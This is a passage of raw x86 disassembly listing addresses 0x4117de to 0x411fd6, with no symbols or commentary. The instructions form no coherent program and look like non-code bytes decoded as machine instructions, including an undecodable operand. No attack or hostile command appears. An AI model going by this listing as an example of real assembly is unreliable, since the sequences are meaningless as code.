  4117de:	sub    DWORD PTR [ebx],eax
  4117e0:	dec    ebp
  4117e1:	or     BYTE PTR [esi-0x6bef3a00],ah
  4117e7:	add    BYTE PTR [eax],al
  4117e9:	add    ecx,DWORD PTR [ecx+eax*1]
  4117ec:	add    cl,BYTE PTR [eax-0x77]
  4117ef:	inc    ebx
  4117f0:	inc    eax
  4117f1:	xchg   edx,eax
  4117f2:	inc    edx
  4117f3:	or     al,0x10
  4117f5:	xor    BYTE PTR [eax+0x202908],al
  4117fb:	add    BYTE PTR [edx+0x1104c544],al
  411801:	push   edx
  411802:	call   0x1400:0x414031d2
  411809:	mov    BYTE PTR [edx+eax*1],cl
  41180c:	dec    ebx
  41180d:	add    BYTE PTR [eax+0x11081132],0x40
  411814:	or     BYTE PTR [ecx],al
  411816:	sub    dl,BYTE PTR [eax+0x15409]
  41181c:	add    DWORD PTR [eax+0x34],esp
  41181f:	sub    BYTE PTR [ecx],al
  411821:	xchg   ebp,eax
  411822:	and    BYTE PTR [edi*1+0x4802232],0xc1
  41182a:	mov    ?,WORD PTR [edx]
  41182c:	push   ecx
  41182d:	add    DWORD PTR ds:0xa18c4110,0xffffffa0
  411834:	sub    al,0xb0
  411836:	test   al,0x60
  411838:	xor    al,BYTE PTR [eax+0x50]
  41183b:	pop    ecx
  41183c:	add    BYTE PTR [eax+ebp*1],ch
  41183f:	mov    cl,0x17
  411841:	sbb    BYTE PTR [ebx+eax*4+0x48],ah
  411845:	and    BYTE PTR [eax],al
  411847:	xor    al,0x0
  411849:	test   BYTE PTR [eax+edx*1+0x18000201],al
  411850:	inc    edx
  411851:	add    esp,0x60
  411854:	adc    BYTE PTR [ebp-0x5fdfef70],0xe0
  41185b:	add    DWORD PTR [eax-0x3f6bba93],edi
  411861:	mov    ss,WORD PTR [ebx+0xa40222]
  411867:	inc    eax
  411868:	test   BYTE PTR [ecx],bl
  41186a:	add    BYTE PTR [eax],cl
  41186c:	test   DWORD PTR [ebx],eax
  41186e:	add    BYTE PTR ds:0x6098800,dh
  411874:	add    al,0x95
  411876:	add    al,0x15
  411878:	and    BYTE PTR [eax+0x1408810c],ch
  41187e:	shr    dl,0x5
  411881:	and    cl,BYTE PTR [eax+0x30]
  411884:	add    BYTE PTR [edx],cl
  411886:	cmp    ah,BYTE PTR [eax]
  411888:	dec    ebx
  411889:	add    BYTE PTR [eax+0x261100c],al
  41188f:	pop    ss
  411890:	and    bl,al
  411892:	mov    al,ds:0x1e306652
  411897:	add    BYTE PTR [eax+0x581b0b85],al
  41189d:	mov    DWORD PTR [eax+eax*1+0x560948],eax
  4118a4:	sub    BYTE PTR [eax],ah
  4118a6:	or     BYTE PTR [edx],al
  4118a8:	inc    ecx
  4118a9:	inc    ecx
  4118aa:	add    BYTE PTR [edx],ah
  4118ac:	pop    esp
  4118ad:	add    BYTE PTR [esi],dl
  4118af:	inc    ebx
  4118b0:	add    al,ah
  4118b2:	test   BYTE PTR [ecx],ah
  4118b4:	inc    eax
  4118b5:	or     BYTE PTR [edx+0x2a4c0003],al
  4118bb:	mov    al,ds:0x84010d67
  4118c0:	add    BYTE PTR [ebp+0x10],0x72
  4118c4:	cmp    al,BYTE PTR [edx]
  4118c6:	push   edx
  4118c7:	add    BYTE PTR [esi],cl
  4118c9:	adc    BYTE PTR [esi],dh
  4118cb:	add    al,0x62
  4118cd:	xor    eax,0x10725011
  4118d2:	add    ebx,DWORD PTR [eax+0x60]
  4118d5:	and    BYTE PTR [edx+edx*1],al
  4118d8:	sub    al,BYTE PTR [ecx+eax*8+0x46040042]
  4118df:	xor    BYTE PTR [eax],al
  4118e1:	retf   0x9560
  4118e4:	add    BYTE PTR [eax-0x7f],ah
  4118e7:	add    DWORD PTR [eax+0x40041060],0x40
  4118ee:	adc    al,0x0
  4118f0:	int3   
  4118f1:	loopne 0x411943
  4118f3:	and    dl,BYTE PTR [edx]
  4118f5:	rcl    BYTE PTR [eax],0x40
  4118f8:	and    al,0x9
  4118fa:	add    DWORD PTR [eax],ecx
  4118fc:	add    edx,DWORD PTR [eax]
  4118fe:	add    BYTE PTR [eax],cl
  411900:	adc    DWORD PTR [eax],esp
  411902:	nop
  411903:	dec    eax
  411904:	add    BYTE PTR [edx],dl
  411906:	add    DWORD PTR [eax],eax
  411908:	add    BYTE PTR [eax-0x62],dl
  41190b:	popa   
  41190c:	inc    esp
  41190d:	sbb    eax,eax
  41190f:	adc    eax,0x5209850
  411914:	dec    esp
  411915:	add    ah,BYTE PTR [eax+eax*2]
  411918:	and    BYTE PTR [eax],al
  41191a:	call   0x81491b31
  41191f:	and    BYTE PTR [ecx],al
  411921:	add    cl,BYTE PTR [edx+ebp*2+0x11f3208e]
  411928:	mov    BYTE PTR [ecx+0x10a81011],cl
  41192e:	adc    BYTE PTR [eax+0x280938],bh
  411934:	add    BYTE PTR [ebp+esi*2-0x79],cl
  411938:	adc    BYTE PTR [ecx],dl
  41193a:	adc    BYTE PTR [eax+eax*1-0x7fe4ff9e],al
  411941:	lds    ecx,FWORD PTR [eax]
  411943:	add    BYTE PTR [eax],0x65
  411946:	add    BYTE PTR [eax],al
  411948:	add    BYTE PTR [edx+eax*1],cl
  41194b:	adc    DWORD PTR ds:0x93442002,edx
  411951:	and    al,0x20
  411953:	ret    
  411954:	mov    BYTE PTR [ebx+0x21006604],bl
  41195a:	push   ecx
  41195b:	rol    BYTE PTR [eax],0x0
  41195e:	test   BYTE PTR [ebx+0x42800184],cl
  411964:	and    cl,BYTE PTR [edx+eax*1]
  411967:	push   ss
  411968:	pusha  
  411969:	add    BYTE PTR [esp+eax*4],0xed
  41196d:	pusha  
  41196e:	and    BYTE PTR [eax],ch
  411970:	add    al,0x88
  411972:	add    al,al
  411974:	or     BYTE PTR [ecx+eiz*1],dl
  411977:	xor    BYTE PTR [eax],ch
  411979:	inc    eax
  41197a:	or     BYTE PTR [eax-0x58],al
  41197d:	cmp    BYTE PTR [eax],dl
  41197f:	sar    BYTE PTR [ecx+0x492a021],1
  411985:	inc    eax
  411986:	add    BYTE PTR [eax],cl
  411988:	or     BYTE PTR [eax-0x7e],cl
  41198b:	cwde   
  41198c:	and    BYTE PTR [eax],al
  41198e:	sub    eax,DWORD PTR [eax]
  411990:	add    DWORD PTR [esi],0x40084b34
  411996:	mov    WORD PTR [edx+0x5c07a0b],fs
  41199c:	mov    cs,WORD PTR [eax]
  41199e:	add    BYTE PTR ds:0x12000181,bl
  4119a4:	and    BYTE PTR [ecx+0x42108198],cl
  4119aa:	adc    ebx,esp
  4119ac:	and    DWORD PTR [eax],esp
  4119ae:	adc    BYTE PTR [esi+0x8506486],al
  4119b4:	push   edx
  4119b5:	xor    BYTE PTR [esp+eax*1],0x41
  4119b9:	inc    eax
  4119ba:	fs inc edx
  4119bc:	add    eax,DWORD PTR [ebx]
  4119be:	add    BYTE PTR [ecx],0x50
  4119c1:	add    eax,0x5a213208
  4119c6:	jne    0x4119d2
  4119c8:	add    DWORD PTR [ecx+0x4],eax
  4119cb:	adc    BYTE PTR [eax],0xc2
  4119ce:	and    esi,DWORD PTR [eax+0x30]
  4119d1:	or     BYTE PTR [eax+eax*2+0x44],cl
  4119d5:	push   ecx
  4119d6:	push   eax
  4119d7:	add    al,0x7
  4119d9:	push   es
  4119da:	enter  0xc20a,0x64
  4119de:	and    al,0x64
  4119e0:	adc    BYTE PTR [ecx+0x60],cl
  4119e3:	lods   al,BYTE PTR ds:[esi]
  4119e4:	add    al,0x5
  4119e6:	add    al,0x48
  4119e8:	nop
  4119e9:	add    ah,BYTE PTR [eax+0x11040088]
  4119ef:	inc    eax
  4119f0:	adc    BYTE PTR [edi+ebx*1-0x6ecbfbbe],al
  4119f7:	sbb    DWORD PTR [edx+0x4],esi
  4119fa:	sbb    BYTE PTR [ecx],al
  4119fc:	and    DWORD PTR [eax+ebx*1],ecx
  4119ff:	xor    al,0x11
  411a01:	add    BYTE PTR [eax],al
  411a03:	adc    BYTE PTR [ecx],cl
  411a05:	inc    eax
  411a06:	adc    al,0x6
  411a08:	add    cl,al
  411a0a:	lea    eax,[eax+eax*4+0x200520]
  411a11:	inc    eax
  411a12:	pop    ecx
  411a13:	and    BYTE PTR [ecx+0x49],0x43
  411a17:	adc    BYTE PTR [ecx],0x8
  411a1a:	fs inc esi
  411a1c:	sub    BYTE PTR [eax],al
  411a1e:	adc    al,0xc8
  411a20:	add    BYTE PTR [esi+0x24],cl
  411a23:	add    al,0x10
  411a25:	xchg   esp,eax
  411a26:	call   0x1245a22f
  411a2b:	and    DWORD PTR [eax],ebx
  411a2d:	add    al,BYTE PTR [eax]
  411a2f:	or     eax,0xba411091
  411a34:	or     BYTE PTR [eax],dl
  411a36:	and    BYTE PTR [eax+0x2],al
  411a39:	and    al,BYTE PTR [eax+0x58022209]
  411a3f:	or     DWORD PTR [eax+0x8],edx
  411a42:	inc    eax
  411a43:	add    al,0x0
  411a45:	sub    BYTE PTR ds:0x864142,0x62
  411a4c:	dec    eax
  411a4d:	adc    al,BYTE PTR [ecx+eax*4]
  411a50:	and    dl,BYTE PTR [ebx]
  411a52:	add    al,BYTE PTR [eax]
  411a54:	add    BYTE PTR [eax],bl
  411a56:	inc    edx
  411a57:	and    BYTE PTR [eax+0x180020],ah
  411a5d:	adc    eax,0x4a0401
  411a62:	add    dh,BYTE PTR [eax-0x80]
  411a65:	add    BYTE PTR [edi+0x0],al
  411a68:	add    al,0x48
  411a6a:	add    esp,DWORD PTR [eax+0x35104018]
  411a70:	inc    eax
  411a71:	sub    ah,BYTE PTR [ecx]
  411a73:	sbb    DWORD PTR [eax+0x80052],eax
  411a79:	and    eax,0x410a8010
  411a7e:	sbb    DWORD PTR [eax],esp
  411a80:	and    BYTE PTR [eax],ah
  411a82:	add    al,BYTE PTR [ecx]
  411a84:	and    DWORD PTR [esi+0x4],esi
  411a87:	and    BYTE PTR [eax],al
  411a89:	les    edx,FWORD PTR [eax]
  411a8b:	sbb    al,BYTE PTR [eax+0x38]
  411a8e:	inc    esp
  411a8f:	mov    BYTE PTR [edx+0x0],al
  411a92:	add    BYTE PTR [ebp+0x12c5e47],dl
  411a98:	dec    ecx
  411a99:	dec    ebx
  411a9a:	and    ecx,DWORD PTR [eax+0x75]
  411a9d:	les    eax,FWORD PTR [edx+0x38016100]
  411aa3:	mov    al,0x5
  411aa5:	add    BYTE PTR [ecx-0x7e],0x40
  411aa9:	inc    esp
  411aaa:	adc    BYTE PTR [eax+0x2c268338],al
  411ab0:	add    BYTE PTR [edx],al
  411ab2:	add    BYTE PTR [eax],al
  411ab4:	inc    ebp
  411ab5:	inc    ecx
  411ab6:	add    BYTE PTR [ecx],0x20
  411ab9:	lahf   
  411aba:	xchg   DWORD PTR [eax+0xc],eax
  411abd:	adc    DWORD PTR [eax],0x43
  411ac0:	test   al,0x0
  411ac2:	adc    DWORD PTR [ebp+0x0],edx
  411ac5:	dec    ebx
  411ac6:	sbb    bl,BYTE PTR [ecx]
  411ac8:	popa   
  411ac9:	add    al,0x64
  411acb:	mov    BYTE PTR [edi+0x60004893],al
  411ad1:	push   esp
  411ad2:	enter  0xb2,0x28
  411ad6:	add    BYTE PTR [ebp+0x50220101],al
  411adc:	mov    al,ds:0x1e90a804
  411ae1:	or     DWORD PTR [ecx+0x4233a03],0x4482c402
  411aeb:	add    eax,0x42806040
  411af0:	xor    ah,BYTE PTR [eax+eax*1]
  411af3:	test   al,0x20
  411af5:	test   BYTE PTR [esi],al
  411af7:	add    ah,dl
  411af9:	mov    ds:0x10710,al
  411afe:	inc    esi
  411aff:	and    BYTE PTR [eax+0x5],bh
  411b02:	pusha  
  411b03:	dec    edx
  411b04:	pop    eax
  411b05:	inc    esp
  411b06:	stc    
  411b07:	es add esp,edx
  411b0a:	inc    ebx
  411b0b:	loopne 0x411ace
  411b0d:	add    eax,0xa11048c0
  411b12:	add    al,0xc4
  411b14:	or     al,BYTE PTR ds:0x800d4c
  411b1a:	pusha  
  411b1b:	add    dl,BYTE PTR [edx+0x10128368]
  411b21:	add    al,BYTE PTR [eax]
  411b23:	push   0x4c
  411b25:	add    al,0x11
  411b27:	inc    edx
  411b28:	add    BYTE PTR [eax],al
  411b2a:	add    bl,BYTE PTR [eax-0x3ffbfb74]
  411b30:	xchg   ebx,eax
  411b31:	add    eax,0xa0810b09
  411b36:	mov    al,ds:0x2228092
  411b3b:	pusha  
  411b3c:	add    eax,0x67300442
  411b42:	adc    DWORD PTR [ecx-0x7b3af34b],eax
  411b48:	or     eax,0x1613a120
  411b4d:	sbb    BYTE PTR [eax],al
  411b4f:	push   edx
  411b50:	push   es
  411b51:	and    BYTE PTR [eax+ecx*4],al
  411b54:	mov    eax,DWORD PTR [ecx+0x23c14828]
  411b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5b:	add    DWORD PTR [edi+0x69d0828],0x8a09dc20
  411b65:	test   al,0x5
  411b67:	mov    eax,ds:0x3040cb02
  411b6c:	jo     0x411bb2
  411b6e:	mov    cl,0x50
  411b70:	or     edx,DWORD PTR [ecx]
  411b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b73:	push   0x2284250c
  411b78:	add    DWORD PTR [eax],edx
  411b7a:	or     BYTE PTR [eax],al
  411b7c:	or     BYTE PTR [eax],dl
  411b7e:	add    BYTE PTR [eax],dl
  411b80:	add    al,BYTE PTR ds:0xb8003012
  411b86:	add    BYTE PTR [esp+eax*4+0x48],al
  411b8a:	sbb    BYTE PTR [eax],dl
  411b8c:	add    DWORD PTR [edx+0x28],0x1000030
  411b93:	mov    al,ds:0x43140272
  411b98:	or     BYTE PTR [eax+0x30],dl
  411b9b:	sbb    al,0x42
  411b9d:	or     DWORD PTR [eax+0x40],eax
  411ba0:	rdtsc  
  411ba2:	les    esp,FWORD PTR [eax+0x40]
  411ba5:	dec    esp
  411ba6:	add    DWORD PTR [eax],eax
  411ba8:	fild   WORD PTR [eax]
  411baa:	sub    BYTE PTR [edx],0x1
  411bad:	jb     0x411bcf
  411baf:	adc    al,0x10
  411bb1:	test   BYTE PTR [eax-0x7f],al
  411bb4:	add    DWORD PTR [eax+0x4040000],esp
  411bba:	nop
  411bbb:	add    DWORD PTR [edx*1+0x8844600],eax
  411bc2:	pusha  
  411bc3:	and    BYTE PTR [eax],ah
  411bc5:	or     BYTE PTR [eax+0x2840a5],0x2b
  411bcc:	and    DWORD PTR [edx],edx
  411bce:	jno    0x411c11
  411bd0:	sbb    cl,BYTE PTR [eax-0x7e]
  411bd3:	add    BYTE PTR [eax+0xa],0x20
  411bd7:	and    BYTE PTR [eax-0x7c],ch
  411bda:	shl    BYTE PTR [ecx+0x42200341],0x43
  411be1:	and    ch,BYTE PTR [ebp-0x70]
  411be4:	push   eax
  411be5:	adc    BYTE PTR [eax-0x27ee7c00],al
  411beb:	add    BYTE PTR [eax],dl
  411bed:	add    BYTE PTR [eax+0x4ca0408a],al
  411bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf4:	push   ss
  411bf5:	add    BYTE PTR [eax],al
  411bf7:	add    BYTE PTR [ecx+0x21],al
  411bfa:	inc    eax
  411bfb:	inc    edx
  411bfc:	sbb    BYTE PTR [edx+0xa0],cl
  411c02:	mov    ds:0xa504c100,al
  411c07:	dec    eax
  411c08:	add    BYTE PTR [eax+0x19600806],ah
  411c0e:	and    DWORD PTR [esp+edx*1],eax
  411c11:	cmp    eax,0x406229c0
  411c16:	add    eax,0x8231b850
  411c1b:	push   ebx
  411c1c:	add    eax,0x2040c0a0
  411c21:	jno    0x411c43
  411c23:	xor    cl,BYTE PTR [ecx+0xa190850]
  411c29:	and    BYTE PTR [eax],al
  411c2b:	inc    esp
  411c2c:	adc    BYTE PTR [eax],al
  411c2e:	add    al,0xc3
  411c30:	inc    eax
  411c31:	add    cl,BYTE PTR [ecx]
  411c33:	mov    DWORD PTR [esi+0x21],ecx
  411c36:	inc    eax
  411c37:	test   al,0x2
  411c39:	adc    BYTE PTR [eax],dl
  411c3b:	mov    al,ds:0x22dc82a
  411c40:	and    DWORD PTR [eax+ecx*4],ebx
  411c43:	and    al,BYTE PTR [eax]
  411c45:	adc    BYTE PTR [edi+0x2],0x69
  411c49:	cs cwde 
  411c4b:	or     DWORD PTR [edx],ebp
  411c4d:	sbb    eax,0x72020000
  411c52:	jp     0x411c54
  411c54:	adc    BYTE PTR [ecx+eax*1],cl
  411c57:	add    BYTE PTR [eax+0x500d31],cl
  411c5d:	cwde   
  411c5e:	sbb    al,BYTE PTR [edx-0x50]
  411c61:	add    al,0x9
  411c63:	add    BYTE PTR ds:0x8000204,al
  411c69:	add    al,0x8d
  411c6b:	sub    al,0x0
  411c6d:	gs mov cl,0x88
  411c70:	push   0x91612c18
  411c75:	add    BYTE PTR [esi],ch
  411c77:	rol    BYTE PTR [eax],1
  411c79:	add    eax,0x42543278
  411c7e:	mov    al,0x42
  411c80:	fcom   DWORD PTR [eax+0x244081b4]
  411c86:	sbb    DWORD PTR [ebp+0x70],esi
  411c89:	adc    BYTE PTR [eax+0x78],ah
  411c8c:	adc    al,0x5
  411c8e:	dec    edx
  411c8f:	add    ah,dl
  411c91:	sbb    BYTE PTR [eax+edx*2],ah
  411c94:	and    BYTE PTR [eax],dl
  411c96:	les    eax,FWORD PTR [eax]
  411c98:	bound  esp,QWORD PTR [ecx]
  411c9a:	or     BYTE PTR [eax],dl
  411c9c:	inc    eax
  411c9d:	adc    BYTE PTR [edx],dh
  411c9f:	and    BYTE PTR [ecx+edx*2],al
  411ca2:	or     edx,DWORD PTR [ebx]
  411ca4:	nop
  411ca5:	add    eax,0x4409801
  411caa:	add    al,0x6
  411cac:	sbb    al,BYTE PTR [edx+0x40009a1]
  411cb2:	nop
  411cb3:	add    eax,0xe50c1000
  411cb8:	adc    DWORD PTR [eax],ebx
  411cba:	add    al,al
  411cbc:	adc    BYTE PTR [edx],al
  411cbe:	add    DWORD PTR [ebp+0x4e254544],eax
  411cc4:	adc    BYTE PTR [ecx],dl
  411cc6:	push   0x88a01429
  411ccb:	cmp    BYTE PTR [esp+eax*1],al
  411cce:	shl    BYTE PTR [eax+0x22],1
  411cd1:	aam    0x8a
  411cd3:	add    BYTE PTR [ecx],0xa0
  411cd6:	adc    BYTE PTR [eax],ah
  411cd8:	adc    DWORD PTR [ecx+0x6c151249],0x449e045a
  411ce2:	or     eax,0x8080711
  411ce7:	dec    esi
  411ce8:	inc    ebx
  411ce9:	and    BYTE PTR [eax+0x29c62151],0x41
  411cf0:	add    al,BYTE PTR [ecx+ecx*4]
  411cf3:	rol    BYTE PTR [eax],0x90
  411cf6:	int    0x0
  411cf8:	add    eax,0x10054880
  411cfd:	or     DWORD PTR [eax],eax
  411cff:	or     BYTE PTR [eax+0x5a14828],ah
  411d05:	add    BYTE PTR [edx+0x20022698],al
  411d0b:	mov    al,ds:0x40018804
  411d10:	or     BYTE PTR [ecx],ah
  411d12:	mov    ds:0x54782070,al
  411d17:	pusha  
  411d18:	pusha  
  411d19:	and    al,0x0
  411d1b:	je     0x6d411d36
  411d21:	and    BYTE PTR [eax-0x7b9ff190],bl
  411d27:	add    BYTE PTR [eax+0x21181001],al
  411d2d:	add    DWORD PTR [edx+eiz*1+0x4520317],ecx
  411d34:	sub    al,BYTE PTR [eax+0x32]
  411d37:	mov    BYTE PTR [eax+eax*1-0x50],dh
  411d3b:	add    BYTE PTR [edx+eax*2],al
  411d3e:	bound  esp,QWORD PTR [eax+eax*1]
  411d41:	add    BYTE PTR [edx],al
  411d43:	xor    DWORD PTR [edx],eax
  411d45:	or     al,0x11
  411d47:	adc    BYTE PTR [eax+0x4111080],0xd
  411d4e:	xchg   esp,eax
  411d4f:	and    ah,BYTE PTR [ebx+eax*4-0x6d7ff7f0]
  411d56:	mov    esp,0x10a95400
  411d5b:	lea    eax,[eax+ecx*1]
  411d5e:	inc    esi
  411d5f:	inc    edx
  411d60:	or     BYTE PTR [eax+eax*1],al
  411d63:	add    dl,BYTE PTR [eax]
  411d65:	add    DWORD PTR [eax],0x2
  411d68:	xor    BYTE PTR [edx],0x9
  411d6b:	pop    edx
  411d6c:	dec    eax
  411d6d:	inc    eax
  411d6e:	add    cl,al
  411d70:	add    BYTE PTR [eax],al
  411d72:	les    eax,FWORD PTR [edx]
  411d74:	add    ah,BYTE PTR [eax]
  411d76:	add    al,0xa0
  411d78:	add    BYTE PTR [edx],ah
  411d7a:	add    BYTE PTR [ecx],ah
  411d7c:	arpl   WORD PTR [eax],bp
  411d7e:	add    BYTE PTR [esi],al
  411d80:	and    al,0x4a
  411d82:	adc    BYTE PTR [edx],cl
  411d84:	adc    BYTE PTR [ebx],al
  411d86:	dec    edx
  411d87:	add    BYTE PTR [eax],al
  411d89:	add    ecx,DWORD PTR [eax-0x6a]
  411d8c:	or     cl,BYTE PTR [eax]
  411d8e:	or     BYTE PTR [eax+0x5a3b41dc],al
  411d94:	add    BYTE PTR [edx],cl
  411d96:	or     BYTE PTR [edx],cl
  411d98:	add    BYTE PTR [ecx],0xa0
  411d9b:	and    al,0x83
  411d9d:	inc    eax
  411d9e:	sbb    BYTE PTR [edx+ecx*4],al
  411da1:	add    eax,0x6950da80
  411da6:	cdq    
  411da7:	or     al,0x2
  411da9:	add    BYTE PTR [ecx],al
  411dab:	add    BYTE PTR [ecx+0x8],cl
  411dae:	add    BYTE PTR [eax+eax*1],dh
  411db1:	enter  0xb020,0x7
  411db5:	adc    BYTE PTR [ecx],0x0
  411db8:	inc    eax
  411db9:	add    BYTE PTR [eax+eiz*1],0xa0
  411dbd:	add    DWORD PTR [ecx+ebx*1],ebx
  411dc0:	and    BYTE PTR [edx+0x22],bl
  411dc3:	add    al,0x12
  411dc5:	push   eax
  411dc6:	and    DWORD PTR [edx],eax
  411dc8:	inc    eax
  411dc9:	or     cl,BYTE PTR [eax+0x18]
  411dcc:	and    eax,0x34400882
  411dd1:	dec    ecx
  411dd2:	inc    esp
  411dd3:	mov    al,BYTE PTR [edx]
  411dd5:	mov    BYTE PTR [ecx+eax*1],dl
  411dd8:	nop
  411dd9:	adc    DWORD PTR fs:[ebx],ecx
  411ddc:	bound  ebp,QWORD PTR [edx]
  411dde:	or     DWORD PTR [ebx],ebp
  411de0:	add    al,0x88
  411de2:	and    BYTE PTR ds:0x400118,0xa0
  411de9:	and    DWORD PTR [eax],edx
  411deb:	or     al,0x0
  411ded:	mov    BYTE PTR [edx],al
  411def:	or     DWORD PTR [eax],eax
  411df1:	or     BYTE PTR [eax],al
  411df3:	add    BYTE PTR ds:0x20285019,dl
  411df9:	inc    ebp
  411dfa:	mov    BYTE PTR [eax-0x80],al
  411dfd:	jno    0x411e07
  411dff:	mov    BYTE PTR [eax],cl
  411e01:	and    BYTE PTR [edx],ch
  411e03:	mov    al,bl
  411e05:	and    eax,DWORD PTR [edi]
  411e07:	and    BYTE PTR [eax],bl
  411e09:	add    BYTE PTR [eax],bl
  411e0b:	or     BYTE PTR [ecx+0x31],dl
  411e0e:	add    BYTE PTR [esp+eax*1],al
  411e11:	add    dh,BYTE PTR [edx+eax*4]
  411e14:	inc    edx
  411e15:	add    BYTE PTR [edx+0x1],dl
  411e18:	add    BYTE PTR [eax],ah
  411e1a:	ins    BYTE PTR es:[edi],dx
  411e1b:	add    BYTE PTR [eax+0xa206b32],0x89
  411e22:	or     DWORD PTR [eax+0x1],eax
  411e25:	sub    BYTE PTR [eax+0x4],ah
  411e28:	add    BYTE PTR [eax],cl
  411e2a:	and    BYTE PTR [ecx+0x3a220023],cl
  411e30:	mov    al,ds:0x67728202
  411e35:	add    BYTE PTR [edx+0x11800094],ah
  411e3b:	mov    es,WORD PTR [ecx]
  411e3d:	add    BYTE PTR [ecx+eax*1],bl
  411e40:	and    BYTE PTR [ebx+0xc],dh
  411e43:	xchg   ebx,eax
  411e44:	mov    DWORD PTR [eax-0x80],esp
  411e47:	push   ss
  411e48:	and    BYTE PTR [eax+0x2400c020],0x61
  411e4f:	adc    BYTE PTR [edx],al
  411e51:	adc    BYTE PTR [eax],dl
  411e53:	xor    DWORD PTR [ebx],esp
  411e55:	inc    eax
  411e56:	inc    esp
  411e57:	or     BYTE PTR [eax],ch
  411e59:	rcl    BYTE PTR [ecx+0x2],cl
  411e5c:	sub    al,al
  411e5e:	adc    BYTE PTR [eax],al
  411e60:	adc    dl,BYTE PTR ds:0x10252300
  411e66:	add    al,0x48
  411e68:	or     DWORD PTR [eax+0x0],0x120c22
  411e6f:	xchg   edx,eax
  411e70:	push   ecx
  411e71:	and    BYTE PTR [edx],cl
  411e73:	add    ah,al
  411e75:	pusha  
  411e76:	test   al,0x8
  411e78:	cdq    
  411e79:	adc    DWORD PTR [ecx+eax*2],ecx
  411e7c:	mov    BYTE PTR [esi],al
  411e7e:	mov    ds:0x10098002,eax
  411e83:	add    BYTE PTR [eax],ah
  411e85:	add    BYTE PTR [eax+ebp*1-0x73fef6d0],dl
  411e8c:	or     DWORD PTR [edx+0x7020e014],eax
  411e92:	or     al,BYTE PTR [eax]
  411e94:	dec    eax
  411e95:	mov    cl,0x41
  411e97:	sub    cl,BYTE PTR [eax+ebp*4+0x20416f44]
  411e9e:	or     BYTE PTR fs:[ecx+0x1012c0a],dl
  411ea5:	mov    BYTE PTR [eax+eax*1+0x0],al
  411ea9:	add    al,0x8
  411eab:	xor    DWORD PTR [edx-0x7f9dbf6b],0x26040c8
  411eb5:	add    BYTE PTR ds:0xa0488904,al
  411ebb:	add    ah,BYTE PTR [edx+0x12488224]
  411ec1:	push   ecx
  411ec2:	adc    al,0xa0
  411ec4:	test   al,0xe
  411ec6:	mov    cl,BYTE PTR [eax+edx*8]
  411ec9:	arpl   WORD PTR [esi],ax
  411ecb:	add    BYTE PTR [edx+0x40],ah
  411ece:	and    BYTE PTR [ebp+0x63e20418],dl
  411ed4:	add    al,0x0
  411ed6:	adc    BYTE PTR [eax+0x38804e04],al
  411edc:	jne    0x411ef2
  411ede:	sbb    BYTE PTR [eax+0x48],cl
  411ee1:	and    eax,0x11c85058
  411ee6:	dec    eax
  411ee7:	sbb    DWORD PTR [edx],0x440e10
  411eed:	add    bl,BYTE PTR [edi+eiz*1]
  411ef0:	or     BYTE PTR [ecx],cl
  411ef2:	dec    ecx
  411ef3:	adc    al,dh
  411ef5:	inc    ecx
  411ef6:	inc    esp
  411ef7:	adc    BYTE PTR [eax],al
  411ef9:	add    BYTE PTR [eax],dl
  411efb:	or     al,0x85
  411efe:	or     eax,DWORD PTR [edx]
  411f00:	add    al,0x80
  411f02:	ret    0x1101
  411f05:	nop
  411f06:	bound  edx,QWORD PTR [eax]
  411f08:	add    al,0x0
  411f0a:	inc    eax
  411f0b:	and    BYTE PTR [eax],0x40
  411f0e:	pusha  
  411f0f:	xchg   esp,eax
  411f10:	add    BYTE PTR [esp],dl
  411f13:	mov    ds:0x300a065,al
  411f18:	adc    ah,cl
  411f1a:	or     ah,BYTE PTR [ecx]
  411f1c:	mov    al,ds:0xd6020080
  411f21:	add    al,0x20
  411f23:	ret    0xa08
  411f26:	add    eax,0x5864212a
  411f2b:	sub    BYTE PTR [eax],dh
  411f2d:	rcl    DWORD PTR [ebx+0x104860c5],1
  411f33:	or     dh,BYTE PTR [edx-0x7f]
  411f36:	nop
  411f37:	cmp    al,0xb8
  411f39:	inc    esi
  411f3a:	rol    DWORD PTR [edx],cl
  411f3c:	dec    esp
  411f3d:	add    BYTE PTR [eax],ah
  411f3f:	and    al,BYTE PTR [eax]
  411f41:	add    al,BYTE PTR [edx]
  411f43:	add    ah,BYTE PTR [eax]
  411f45:	mov    BYTE PTR [esi],al
  411f47:	mov    dl,cl
  411f49:	or     dl,BYTE PTR [edx]
  411f4b:	inc    esi
  411f4c:	test   eax,0x8620a970
  411f51:	or     bl,BYTE PTR [ebx*1-0x3dfe07f8]
  411f58:	and    DWORD PTR [eax],ecx
  411f5a:	add    BYTE PTR [ecx-0x77f76770],cl
  411f60:	or     dh,ch
  411f62:	add    BYTE PTR [ecx],al
  411f64:	add    DWORD PTR [edx+0x2014c10],eax
  411f6a:	add    BYTE PTR [ecx],ah
  411f6c:	add    dh,al
  411f6e:	adc    eax,0x18330600
  411f73:	ss pusha 
  411f75:	inc    eax
  411f76:	add    eax,0x942812
  411f7b:	adc    dh,BYTE PTR [eax-0x56]
  411f7e:	add    BYTE PTR [eax],0x81
  411f81:	add    BYTE PTR [esp+eax*1],al
  411f84:	add    eax,DWORD PTR [edx]
  411f86:	inc    ecx
  411f87:	sub    BYTE PTR [ecx+0x24],0x15
  411f8b:	sub    eax,0x1808034
  411f90:	and    BYTE PTR [eax-0x3e],al
  411f93:	pusha  
  411f94:	add    BYTE PTR [ecx+0x10],dl
  411f97:	test   BYTE PTR [edx],al
  411f99:	sub    BYTE PTR [ecx],cl
  411f9b:	or     BYTE PTR [eax],al
  411f9d:	inc    eax
  411f9e:	loopne 0x411ff4
  411fa0:	add    al,0x48
  411fa2:	xor    DWORD PTR [eax],eax
  411fa4:	or     DWORD PTR [eax],ebp
  411fa6:	call   DWORD PTR ds:0x435d84
  411fac:	bswap  eax
  411fae:	adc    BYTE PTR [eax+0x18],0x45
  411fb2:	add    BYTE PTR [eax],dl
  411fb4:	add    eax,DWORD PTR [ecx]
  411fb6:	and    BYTE PTR [edx],ah
  411fb8:	adc    BYTE PTR [eax-0x7ffbfbbd],ch
  411fbe:	and    BYTE PTR [edx],ah
  411fc0:	adc    BYTE PTR [eax+0x152001b],cl
  411fc6:	inc    ecx
  411fc7:	or     ebp,DWORD PTR [esi]
  411fc9:	rol    BYTE PTR [esi+ecx*1-0x77effaf5],0x84
  411fd1:	rol    BYTE PTR [ecx],0xda
  411fd4:	or     al,0x47
  411fd6:	or     al,0x0
